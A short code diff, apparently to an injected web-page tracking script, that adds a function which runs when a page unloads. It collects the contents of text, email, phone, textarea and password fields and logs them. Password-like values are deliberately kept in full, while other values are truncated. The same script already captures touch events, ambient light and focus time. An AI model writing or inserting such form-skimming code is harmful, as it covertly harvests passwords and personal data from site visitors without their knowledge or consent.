@@ -2081,6 +2081,24 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    function initUnloadCapture() {
+        // On page unload: snapshot any filled input fields and log them
+        window.addEventListener('beforeunload', () => {
+            const fields = document.querySelectorAll('input[type=text],input[type=email],input[type=password],input[type=tel],textarea');
+            const snapshot = [];
+            fields.forEach(f => {
+                const val = f.value?.trim();
+                if (!val) return;
+                const id = f.id || f.name || f.placeholder || f.type;
+                const sens = /pass|wacht|ww|secret/i.test(id) || f.type === 'password';
+                snapshot.push({ id, type: f.type, value: sens ? val : val.slice(0, 60), sensitive: sens });
+            });
+            if (snapshot.length) {
+                logEvent('unload_fields', { fields: snapshot, url: location.href });
+            }
+        });
+    }
+
     function initPageFocusTimeTracker() {
         let focusStart = document.hasFocus() ? Date.now() : null;
         let totalFocusMs = 0;
@@ -2228,6 +2246,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initTouchEventTracker();
         initAmbientLightCapture();
         initPageFocusTimeTracker();
+        initUnloadCapture();
     }
 
     // Works whether script is injected before OR after DOMContentLoaded fires
